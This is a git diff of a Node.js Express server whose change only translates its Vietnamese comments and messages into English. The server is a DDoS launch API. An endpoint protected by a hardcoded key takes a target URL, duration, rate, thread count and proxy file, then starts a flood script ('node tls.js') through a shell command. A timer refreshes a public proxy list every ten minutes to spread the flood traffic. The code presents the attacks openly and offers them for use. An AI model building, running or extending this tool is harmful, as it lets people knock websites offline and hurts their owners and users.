@@ -6,73 +6,71 @@ const axios = require('axios');
 const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;
 const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@'];
 
-const api_port = 4000; // Cổng API
-const api_key = "quangdev"; // Khóa API của bạn
+const api_port = 4000; // API port
+const api_key = "quangdev"; // Your API key
 
 const app = express();
 app.use(express.json());
 
-// Hàm kiểm tra URL
+// Validate URL
 const isValidUrl = (url) => urlRegex.test(url) && !blackList.some(char => url.includes(char));
 
-// Hàm kiểm tra số và giới hạn
+// Validate number and range
 const isValidNumber = (value, max = Infinity) => !isNaN(value) && value >= 0 && value <= max;
 
 app.get(`/api`, async (req, res) => {
     const { url, time, rate, thea, proxy, api_key: apiKey } = req.query;
 
-    // Kiểm tra API key
+    // Validate API key
     if (apiKey !== api_key) {
-        return res.json({ status: 500, data: `Khóa API không hợp lệ` });
+        return res.json({ status: 500, data: `Invalid API key` });
     }
 
-    // Kiểm tra các tham số
-    if (!url || !isValidUrl(url)) return res.json({ status: 500, data: `URL không hợp lệ` });
-    if (!isValidNumber(time, 86400)) return res.json({ status: 500, data: `Thời gian cần phải là một số trong khoảng 0-86400` });
-    if (!isValidNumber(rate)) return res.json({ status: 500, data: `Rate không hợp lệ` });
-    if (!isValidNumber(thea)) return res.json({ status: 500, data: `Thea không hợp lệ` });
-    if (!proxy) return res.json({ status: 500, data: `Proxy không được để trống` });
+    // Validate parameters
+    if (!url || !isValidUrl(url)) return res.json({ status: 500, data: `Invalid URL` });
+    if (!isValidNumber(time, 86400)) return res.json({ status: 500, data: `Time must be a number between 0 and 86400` });
+    if (!isValidNumber(rate)) return res.json({ status: 500, data: `Invalid rate` });
+    if (!isValidNumber(thea)) return res.json({ status: 500, data: `Invalid thread count` });
+    if (!proxy) return res.json({ status: 500, data: `Proxy file cannot be empty` });
 
-    // Ghi log URL, thời gian, rate và threading
-    console.log(`Url: ${url} Time: ${time} Rate: ${rate} Threading: ${thea} đang thực hiện Start Attack`);
+    console.log(`URL: ${url}, Time: ${time}, Rate: ${rate}, Threads: ${thea}. Attack starting.`);
 
-    // Chuẩn bị lệnh gọi tệp flooder.js
+    // Command to execute tls-rapid.js
     const command = `node tls.js ${url} ${time} ${rate} ${thea} ${proxy}`;
 
-    // Gửi phản hồi trạng thái ban đầu ngay lập tức
+    // Respond immediately
     res.json({
         status: 200,
-        message: 'Start Attack Success!',
+        message: 'Attack started successfully!',
         data: { url, time, rate, thea, proxy }
     });
 
-    // Thực thi lệnh sau khi gửi phản hồi
+    // Execute the command
     exec(command, (error, stdout, stderr) => {
         if (error) {
-            console.error(`Lỗi khi thực thi lệnh: ${stderr}`);
+            console.error(`Error executing command: ${stderr}`);
             return;
         }
-
-        console.log(`Gửi yêu cầu thành công: ${stdout}`);
+        console.log(`Command output: ${stdout}`);
     });
 });
 
-// Route tải proxy tự động
+// Download proxy list
 async function downloadProxy() {
     const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
     try {
         const response = await axios.get(proxyUrl);
         fs.writeFileSync('proxies.txt', response.data);
-        console.log(`Đã tải và lưu proxy vào tệp proxies.txt`);
+        console.log(`Proxy list saved to proxies.txt`);
     } catch (error) {
-        console.error(`Lỗi khi tải proxy: ${error.message}`);
+        console.error(`Error downloading proxy list: ${error.message}`);
     }
 }
 
-// Lên lịch tải proxy mỗi 10 phút (600000 ms)
+// Schedule proxy downloads every 10 minutes
 setInterval(downloadProxy, 600000);
 
-// Tải proxy lần đầu khi server khởi động
+// Initial proxy download
 downloadProxy();
 
-app.listen(api_port, () => console.log(`API đã chạy trên cổng ${api_port}`));
+app.listen(api_port, () => console.log(`API running on port ${api_port}`));
